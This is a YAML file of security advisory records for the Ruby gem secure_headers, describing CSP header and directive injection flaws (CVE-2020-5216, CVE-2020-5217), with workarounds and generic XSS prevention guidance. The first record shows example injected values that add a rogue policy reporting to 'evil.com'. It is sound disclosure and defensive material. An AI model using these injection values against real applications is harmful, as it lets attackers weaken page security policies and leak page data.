---
- id: rubyadvisory:rubygems:secure_headers:CVE-2020-5216
  title: secure_headers header injection due to newline
  description: |-
    If user-supplied input was passed into append/override_content_security_policy_directives,
    a newline could be injected leading to limited header injection.

    Upon seeing a newline in the header, rails will silently create a new Content-Security-Policy
    header with the remaining value of the original string. It will continue to create new headers
    for each newline.

    e.g.

    ```
    override_content_security_directives(script_src: ['mycdn.com', "\ninjected\n"])
    ```

    would result in

    ```
    Content-Security-Policy: ... script-src: mycdn.com
    Content-Security-Policy: injected
    Content-Security-Policy: rest-of-the-header
    ```

    CSP supports multiple headers and all policies must be satisfied for execution to occur, but a malicious value that reports the current page is fairly trivial:

    ```
    override_content_security_directives(script_src: ["mycdn.com", "\ndefault-src 'none'; report-uri evil.com"])
    ```

    ```
    Content-Security-Policy: ... script-src: mycdn.com
    Content-Security-Policy: default-src 'none'; report-uri evil.com
    Content-Security-Policy: rest-of-the-header
    ```

    Workarounds
    ```
    override_content_security_policy_directives(:frame_src, [user_input.gsub("\n", " ")])
    ```
  affected_package: secure_headers
  patched_versions:
  - ">= 6.3.0"
  - "~> 3.9.0"
  - "~> 5.2.0"
  severity: medium
  package_manager: rubygems
  cve:
  - CVE-2020-5216
  cvss_v3_score: 4.4
  disclosed_date: 2020-01-23
  created_date: 2020-01-23
  last_modified_date: 2020-01-23
  credit:
  - Rubysec
  references:
  - https://github.com/rubysec/ruby-advisory-db
  source_url: https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg
- id: rubyadvisory:rubygems:secure_headers:CVE-2020-5217
  title: secure_headers directive injection using semicolon
  description: |-
    If user-supplied input was passed into append/override_content_security_policy_directives,
    a semicolon could be injected leading to directive injection.

    This could be used to e.g. override a script-src directive. Duplicate directives are ignored
    and the first one wins. The directives in secure_headers are sorted alphabetically so they
    pretty much all come before script-src. A previously undefined directive would receive a value
    even if SecureHeaders::OPT_OUT was supplied.

    The fixed versions will silently convert the semicolons to spaces and emit a deprecation warning
    when this happens. This will result in innocuous browser console messages if being
    exploited/accidentally used. In future releases, we will raise application errors resulting in
    500s.

    > Duplicate script-src directives detected. All but the first instance will be ignored.

    See https://www.w3.org/TR/CSP3/#parse-serialized-policy

    > Note: In this case, the user agent SHOULD notify developers that a duplicate directive was
    > ignored. A console warning might be appropriate, for example.

    # Workarounds

    If you are passing user input into the above methods, you could filter out the input:

    ```
    override_content_security_policy_directives(:frame_src, [user_input.gsub(";", " ")])
    ```
  affected_package: secure_headers
  patched_versions:
  - ">= 6.2.0"
  - "~> 3.8"
  - "~> 5.1"
  severity: medium
  package_manager: rubygems
  cve:
  - CVE-2020-5217
  cvss_v3_score: 4.4
  disclosed_date: 2020-01-23
  created_date: 2020-01-23
  last_modified_date: 2020-01-23
  credit:
  - Rubysec
  references:
  - https://github.com/rubysec/ruby-advisory-db
  source_url: https://github.com/twitter/secure_headers/security/advisories/GHSA-xq52-rv6w-397c
- id: snykio:rubygems:secure_headers:543239
  title: Command Injection
  description: |
    [secure\_headers][1] is a library that manages application of security
    headers with many safe defaults.

    Affected versions of this package are vulnerable to Command Injection.
    If user-supplied input was passed into
    `append/override_content_security_policy_directives`, a semicolon could
    be injected and used to override a script directive, leading to command
    injection.



    [1]: https://rubygems.org/gems/secure_headers
  affected_package: secure_headers
  vulnerable_versions:
  - "<3.8.0"
  - ">=5.0.0  <5.1.0"
  - ">=6.0.0  <6.2.0"
  severity: medium
  package_manager: rubygems
  cve:
  - CVE-2020-5217
  cwe:
  - CWE-78
  disclosed_date: 2020-01-21
  created_date: 2020-01-24
  last_modified_date: 2020-01-24
  credit:
  - Greg Ose
  - mvgijssel
  references:
  - https://github.com/twitter/secure_headers/security/advisories/GHSA-xq52-rv6w-397c
  source_url: https://snyk.io/vuln/SNYK-RUBY-SECUREHEADERS-543239
- id: snykio:rubygems:secure_headers:543240
  title: Cross-site Scripting (XSS)
  description: |+
    [secure\_headers][1] is a library that manages application of security
    headers with many safe defaults.

    Affected versions of this package are vulnerable to Cross-site Scripting
    (XSS). If user-supplied input was passed into
    `append/override_content_security_policy_directives`, a newline could be
    injected leading to limited header injection.



    [1]: https://rubygems.org/gems/secure_headers
    \nA cross-site scripting attack occurs when the attacker tricks a
    legitimate web-based application or site to accept a request as
    originating from a trusted source.

    This is done by escaping the context of the web application; the web
    application then delivers that data to its users along with other
    trusted dynamic content, without validating it. The browser unknowingly
    executes malicious script on the client side (through client-side
    languages; usually JavaScript or HTML) in order to perform actions that
    are otherwise typically blocked by the browser’s Same Origin Policy.

    ֿInjecting malicious code is the most prevalent manner by which XSS is
    exploited; for this reason, escaping characters in order to prevent this
    manipulation is the top method for securing code against this
    vulnerability.

    Escaping means that the application is coded to mark key characters, and
    particularly key characters included in user input, to prevent those
    characters from being interpreted in a dangerous context. For example,
    in HTML, `<` can be coded as `&lt`; and `>` can be coded as `&gt`; in
    order to be interpreted and displayed as themselves in text, while
    within the code itself, they are used for HTML tags. If malicious
    content is injected into an application that escapes special characters
    and that malicious content uses `<` and `>` as HTML tags, those
    characters are nonetheless not interpreted as HTML tags by the browser
    if they’ve been correctly escaped in the application code and in this
    way the attempted attack is diverted.

    The most prominent use of XSS is to steal cookies (source: OWASP
    HttpOnly) and hijack user sessions, but XSS exploits have been used to
    expose sensitive information, enable access to privileged services and
    functionality and deliver malware.

    ### Types of attacks   {#types-of-attacks}

    There are a few methods by which XSS can be manipulated:

    | Type | Origin | Description |
    |----------
    | **Stored** | Server | The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link. |
    | **Reflected** | Server | The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser. |
    | **DOM-based** | Client | The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data. |
    | **Mutated** |  | The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters. |

    ### Affected environments   {#affected-environments}

    The following environments are susceptible to an XSS attack:

    * Web servers
    * Application servers
    * Web application environments

    ### How to prevent   {#how-to-prevent}

    This section describes the top best practices designed to specifically
    protect your code:

    * Sanitize data input in an HTTP request before reflecting it back,
      ensuring all data is validated, filtered or escaped before echoing
      anything back to the user, such as the values of query parameters
      during searches.
    * Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces
      to their respective HTML or URL encoded equivalents.
    * Give users the option to disable client-side scripts.
    * Redirect invalid requests.
    * Detect simultaneous logins, including those from two separate IP
      addresses, and invalidate those sessions.
    * Use and enforce a Content Security Policy (source: Wikipedia) to
      disable any features that might be manipulated for an XSS attack.
    * Read the documentation for any of the libraries referenced in your
      code to understand which elements allow for embedded HTML.

  affected_package: secure_headers
  vulnerable_versions:
  - "<3.9.0"
  - ">=5.0.0  <5.2.0"
  - ">=6.0.0  <6.3.0"
  severity: high
  package_manager: rubygems
  cve:
  - CVE-2020-5216
  cwe:
  - CWE-79
  disclosed_date: 2020-01-21
  created_date: 2020-01-24
  last_modified_date: 2020-01-24
  credit:
  - Unknown
  references:
  - https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg
  source_url: https://snyk.io/vuln/SNYK-RUBY-SECUREHEADERS-543240
